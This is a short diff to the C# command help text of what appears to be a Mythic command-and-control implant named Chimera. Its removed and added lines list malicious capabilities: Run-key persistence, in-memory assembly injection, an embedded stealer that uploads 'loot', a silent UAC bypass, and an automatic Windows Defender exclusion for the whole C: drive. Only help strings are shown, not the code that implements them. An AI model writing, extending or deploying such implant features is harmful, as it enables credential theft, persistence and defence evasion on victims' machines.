@@ -18,11 +18,9 @@ namespace Chimera.Commands
             sb.AppendLine("upload <remote> <local>  Upload file from agent to Mythic");
             sb.AppendLine("download <url> <local>   Download file from Mythic to agent");
             sb.AppendLine("sleep <seconds> [jitter] Change beacon interval");
-            sb.AppendLine("persist                  Copy agent to AppData and set HKCU Run key");
-            sb.AppendLine("inject_assembly <args>   Load embedded .NET DLL in-memory and call Run()");
-            sb.AppendLine("runas_exec <cmd>         Run command via runas verb (UAC elevation prompt)");
-            sb.AppendLine("run_stealer             Execute embedded stealer shellcode (inject_assembly)");
-            sb.AppendLine("bypass                  Try silent UAC bypass and add Defender C:\\ exclusion");
+            sb.AppendLine("persist                  Fileless encrypted persistence (HKCU Run + blob)");
+            sb.AppendLine("run_stealer              Inject and run the embedded stealer, then uploads loot");
+            sb.AppendLine("bypass                   Silent UAC bypass + auto Defender C:\\ exclusion");
             sb.AppendLine("kill                     Terminate agent process");
             sb.AppendLine("help                     Show this help");
             return sb.ToString();
